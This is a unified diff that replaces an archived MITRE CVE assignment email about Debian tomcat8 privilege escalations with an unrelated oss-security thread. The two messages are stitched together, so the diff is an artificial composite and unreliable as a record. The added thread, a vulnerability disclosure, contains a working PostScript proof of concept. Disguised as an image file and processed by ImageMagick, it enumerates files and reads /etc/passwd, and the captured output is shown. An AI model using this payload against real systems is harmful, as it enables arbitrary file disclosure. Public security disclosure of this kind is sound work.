@@ -1,50 +1,110 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/02/10
-Message-ID: <2bc979517e9049968c78e77c115c6ad9@imshyb02.MITRE.ORG>
-Date: Fri, 2 Dec 2016 13:05:50 -0500
-From: <cve-assign@...re.org>
-To: <seb@...ian.org>
-CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>
-Subject: Re: CVE request: tomcat privilege escalations in Debian packaging
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/28/13
+Message-ID: <CAJ_zFkKLKL_oZh=piots50kK=OqYvBBd3DQeehNNCzqAU4RV-Q@mail.gmail.com>
+Date: Wed, 28 Sep 2016 13:52:36 -0700
+From: Tavis Ormandy <taviso@...gle.com>
+To: oss-security@...ts.openwall.com
+Subject: Re: ImageMagick identify "d:" hangs
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+On Wed, Sep 28, 2016 at 11:16 AM, Tavis Ormandy <taviso@...gle.com> wrote:
+> On Tue, Sep 27, 2016 at 7:56 AM, Bob Friesenhahn
+> <bfriesen@...ple.dallas.tx.us> wrote:
+>>
+>> On Tue, 27 Sep 2016, Jakub Wilk wrote:
+>>
+>>> * Bob Friesenhahn <bfriesen@...ple.dallas.tx.us>, 2016-09-27, 08:48:
+>>>>
+>>>> From my own investigations, I used
+>>>>
+>>>>  identify -debug all "d:"
+>>>>
+>>>> and see that a temporary file is reported to be created and then the program hangs which no apparent CPU usage.
+>>>
+>>>
+>>> strace tells me that it waits for input on stdin.
+>>> This is a simpler way to make it "hang":
+>>>
+>>>  identify -
+>>
+>>
+>> This is what I expected was happening.  The main thing to investigate is if the "ImageTragick" patches distributions are using do protect against this possible issue as well.
+>>
+>
+> You know, you reminded me that the pdf and/or the ps delegate probably
+> allows filesystem enumeration via filenameforall, as far as I know
+> that's permitted with -dSAFER. I think that's probably unexpected.
+>
+> For example, if you try to identify a file like this, it will list
+> local usernames on stdout, I guess a real attack would have to encode
+> that in the output somehow, but I only know enough postscript to know
+> i'd rather write bf. Might be a fun exercise for masochistic hackers
+> though.
+>
+> $ cat whatever.jpeg
+> %PDF-1.0
+> (/home/*) {==} 256 string filenameforall
+> $ identify whatever.jpeg
+> (/home/taviso)
+> identify.im6: Postscript delegate failed `whatever.jpeg': No such file
+> or directory @ error/pdf.c/ReadPDFImage/677.
+>
+> Tavis.
 
->   * Privilege escalation when upgrading tomcat8 package
->     https://bugs.debian.org/845393
-> 
->     create a symlink
+Maybe I'm missing something, because .libfile also works, this seems
+like free arbitrary file disclosure?
 
-Use CVE-2016-9774.
+Here is the code I'm testing with (Note: I really don't know much
+postscript - and I hate it).
 
+$ cat test.ps
+/dumpname {
+    dup             % copy filename
+    dup             % copy filename
+    print           % print filename
+    (\n) print      % print newline
+    status          % stat filename
+    {
+        (stat succeeded\n) print
+        ( ctime:) print
+        64 string cvs print
+        ( atime:) print
+        64 string cvs print
+        ( size:) print
+        64 string cvs print
+        ( blocks:) print
+        64 string cvs print
+        (\n) print
+        (\n) print
+    }{
+        (unable to stat\n\n) print
+    } ifelse
+    .libfile        % open as library
+    {
+        (.libfile returned file\n\n) print
+        64 string readstring
+        pop         % discard result (should proably test)
+        print
+        (\n) print
+    }{
+        (.libfile returned string\n) print
+        print
+        (\n) print
+    } ifelse
+} def
 
->   * Privilege escalation when removing tomcat8 package
->     https://bugs.debian.org/845385
-> 
->     leave the file world-writable, setgid root
+(/etc/pass*) /dumpname load 256 string filenameforall
 
-Use CVE-2016-9775.
+$ identify test.ps
+/etc/passwd
+stat succeeded
+ ctime:1474998792 atime:1474998792 size:2662 blocks:8
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+.libfile returned file
 
-iQIcBAEBCAAGBQJYQbZLAAoJEHb/MwWLVhi26aEP/ivGNYnCc7vu3VwntDka67ma
-DDy626ySFxqZ42rsqODKp+sUDTcvpSl3zrdjMgD2RsFcozm/Wxw3UrfwsCA2hyJe
-7777Ho0aXuncTFtj+X/iWWbe0lgua1txSHukKmHrj8OUGdFrLZ++V0cKvo/UB2YC
-rrezzxvjTs5MyB7hfJTIq7adB2NU02Zoq5SZG6hwZ7KJvL7BwR6S2zJcqEyE9lNB
-mH9ELOcAJVEDkLp08TO+Gsjzttn5+VgV2d2Z/FZ88QlvET/pUDnq2lFE9VLwK7LH
-bQ2/DXlr7L3ysQowFW8wKfVmRrIGfBf6ghSJB14HLsISpUan09M/Hxia2gnBDrqG
-cFZxuqk8rB82+Wv/8d0MpYHY7wraLn1xtya0uEosq77zANLFYAUagH2U0tbKmy6x
-Ynw5XlJSSfdrz99YNvUYSo9stdc0tl1fh+U+TVdceSymX05vBixrn1/6mG9U2rMO
-NovO4Vw4ZlhGXhNbIfIBUC9zFeOuWMopv7TYK+koOZyMlDVRHFpCzg/uJWgM9GhX
-8SmBKTu/30JFYQMXQxEr+FeK3HH4ypkuHh4ypipC3X1SSh/a/+b47HTKA4Zq3MCb
-Cq+ujDVuJTHjxBrfJjdYj5pdV8L5UKPCYCwVbTq4zYKDpvNwkymk6sNitx8rl+4z
-zfAuJp63CxW2QXE2CgKx
-=xpEE
------END PGP SIGNATURE-----
+root:x:0:0:root:/root:/bin/bash
+
+It seems obvious you can manipulate the output based on this. I'd be
+interested to hear why I'm wrong about this.
+
+Tavis.
